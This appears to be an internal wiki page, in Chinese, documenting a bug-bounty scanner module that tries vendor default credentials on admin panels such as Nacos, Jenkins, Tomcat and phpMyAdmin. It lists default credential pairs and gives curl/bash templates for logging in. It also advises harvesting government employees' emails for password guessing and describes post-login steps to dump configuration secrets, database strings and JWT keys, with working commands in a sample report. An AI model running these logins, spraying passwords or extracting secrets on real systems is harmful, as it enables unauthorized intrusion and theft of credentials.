---
type: wiki
category: hunter
hunter: weak-login
status: active
last-updated: 2026-04-21
---

# Hunter: `weak-login`

> **目的：** 對常見管理介面送 **1-3 次** default credential 嘗試（不是暴力爆破）。
> **設計原則：** 先 HEAD/GET 確認 vendor panel 存在，才送 login request；每個 vendor 最多 3 次嘗試。

## 為什麼不是「爆破」

- **爆破 = 每秒數十到數百次 login** → 會被 WAF 擋、會被 rate limit 拒絕
- **weak-login** = 每個 vendor 1-3 次已知 default 組合 → 幾乎不被偵測
- 本質：**vendor default cred 驗證**，而不是猜密碼

## 用法

```bash
# 完整掃描
tools/hunters/hunt-weak-login.sh https://target

# SAFE=1：只跑「1 次 request 即可判斷」的 vendor（最保守）
SAFE=1 tools/hunters/hunt-weak-login.sh https://target

# 經 bbflow
bbflow hunt target --only weak-login
```

### 輸出

```
./weak_login_out/https_target.txt
```

```
[12:34:56] === Weak-login hunt: https://target (SAFE=0) ===
[12:34:57] • Nacos panel detected → trying default creds
🔴 [P1-CRIT] Nacos default creds nacos:nacos → token issued @ https://target/nacos/
     evidence: {"accessToken":"eyJhbGci...","tokenTtl":18000,"globalAdmin":true}
```

## 覆蓋的 vendor（12 個主要 + 5 個被動偵測）

| Vendor | Default cred | 流程 |
|--------|-------------|------|
| **Nacos** | `nacos / nacos` | POST `/nacos/v1/auth/users/login` → `accessToken` |
| **Druid** | `admin / admin` | POST `/druid/submitLogin.html` → session cookie → index |
| **Grafana** | `admin / admin` | POST `/login` with JSON → `Logged in` |
| **phpMyAdmin** | `root`, `root:root`, `root:password` | 抓 token → POST `/phpmyadmin/index.php` → 判 `server_databases.php` |
| **Jenkins** | `admin:admin`, `admin:password`, `admin:jenkins`, `jenkins:jenkins` | Basic Auth on `/api/json` |
| **Tomcat Manager** | `tomcat:tomcat`, `admin:admin`, `admin:tomcat`, `manager:manager` | Basic Auth on `/manager/html` |
| **Solr** | 先試 unauth，再試 `solr:SolrRocks` | `/solr/admin/info/system` |
| **RabbitMQ Management** | `guest:guest` | `/api/overview` |
| **Kibana** | 通常 unauth | `/api/status` |
| **SpringBoot Admin** | 通常 unauth | `/applications` |
| **Zabbix** | `Admin / zabbix` | POST `/zabbix/index.php` |
| **Apollo** | `apollo / admin` | POST `/signin` |
| **Superset** | manual 提示 | panel 偵測，提示 admin:admin / admin:superset |
| **Airflow** | manual 提示 | panel 偵測，提示 airflow:airflow |
| **Jeecg/Jeesite** | manual 提示 | panel 偵測，提示 admin:123456 / jeecg:jeecg |
| **Shiro** | rememberMe cookie 偵測 | 可能 CVE-2016-4437 / CVE-2020-1957 |
| **Gitea/GitLab** | 開放註冊偵測 | `/user/sign_up`, `/users/sign_up` |

## 擴充：加自己的 vendor

編輯 `hunt-weak-login.sh`，複製這個模板：

```bash
# ═══════════════════════════════════════════════════════════════
# YourVendor — POST /login endpoint
# Default: admin / changeme
# ═══════════════════════════════════════════════════════════════
if exists "/yourvendor/login" "YourVendor Admin|YourVendor Console"; then
  log "• YourVendor panel detected → trying default creds"
  R=$(curl -sk --max-time 8 -X POST "$HOST/yourvendor/api/login" \
    -H "Content-Type: application/json" \
    -d '{"user":"admin","password":"changeme"}' 2>/dev/null)
  if echo "$R" | grep -qE '"token"|"sessionId"|"success":true'; then
    hit "[P1-CRIT] YourVendor default creds admin:changeme @ $HOST"
  fi
fi
```

## 不要用這個工具做什麼

- ❌ **不要跑 SSH/FTP/RDP 弱密碼** — 這是爆破，不在 scope 內
- ❌ **不要加超過 5 個 cred 組合** — 進入爆破範疇，會被擋
- ❌ **不要對未授權標的跑** — 這是主動攻擊行為
- ❌ **不要擴充成「試各種 username」** — 變成 credential stuffing

## 被動情報來源（推薦搭配）

先從 OSINT 得到員工 email，再試那個 email + 常見 password：

```bash
# 從該域名抽 email
theHarvester -d target.gov.tw -b all > emails.txt
gau target.gov.tw | grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' | sort -u >> emails.txt

# 對每個 email，試單次 password（不爆破）
# 密碼候選：公司名+年份 / Taiwan@2025 / 機關簡稱 + 123
```

這類「定向單次測試」比 weak-login 更精準，但需要手動搭配。

## 跟其他 hunter 的配合

```
config-leak   → /grafana 存在    → weak-login 試 admin:admin
devops-unauth → /jenkins 存在    → weak-login 試 admin:admin / admin:password
weak-login    → 發現 Shiro cookie → 用 shiro exploit 工具驗證 CVE
weak-login    → 登入 Nacos       → dump config list（/nacos/v1/cs/configs）
weak-login    → 登入 Druid       → 抓 DB 連線字串 → 連 DB 驗證
```

## 報告寫法

**報告重點：**
- 必須證明**能登入**（附登入後的 API response 或截圖）
- **登入後能做什麼** — 讀 / 改 / 執行 command（Jenkins script console = RCE）
- **不要誇大** — 只有 Nacos admin 頁面 ≠ 一定能 dump 全系統 config

範例：

```markdown
## 漏洞概述
https://target.gov.tw/nacos/ 使用 Nacos 預設管理員帳密 `nacos:nacos`，攻擊者可：
1. 登入 Nacos 管理介面
2. Dump 所有 DataID 的配置檔
3. 其中 `application.yml` 含 DB_PASSWORD、JWT_SECRET

## 重現步驟
```bash
# 1. 驗證預設帳密
curl -sk -X POST 'https://target.gov.tw/nacos/v1/auth/users/login' \
  --data-urlencode "username=nacos" \
  --data-urlencode "password=nacos"
# {"accessToken":"eyJhbG...","tokenTtl":18000,"globalAdmin":true}

# 2. 列出所有 DataID
curl -sk 'https://target.gov.tw/nacos/v1/cs/configs?pageNo=1&pageSize=200&search=accurate' \
  -H "accessToken: eyJhbG..." | python3 -m json.tool | grep dataId

# 3. 抓敏感配置
curl -sk 'https://target.gov.tw/nacos/v1/cs/configs?dataId=application.yml&group=DEFAULT_GROUP' \
  -H "accessToken: eyJhbG..."
```

## 影響
- DB 連線字串洩漏（已驗證）
- JWT secret 洩漏 → 可偽造任何使用者 token（已驗證）
- Nacos 為中央配置中心 → 影響連動的 N 個微服務

## Severity
P1-CRITICAL（直接 admin access + 可讀取線上生產環境 secret）
```

## 關聯文件

- [03-xray-rules-reference.md](03-xray-rules-reference.md)
- [02-gov-site-quick-wins.md](02-gov-site-quick-wins.md) §#4
- [10-hunter-config-leak.md](10-hunter-config-leak.md)
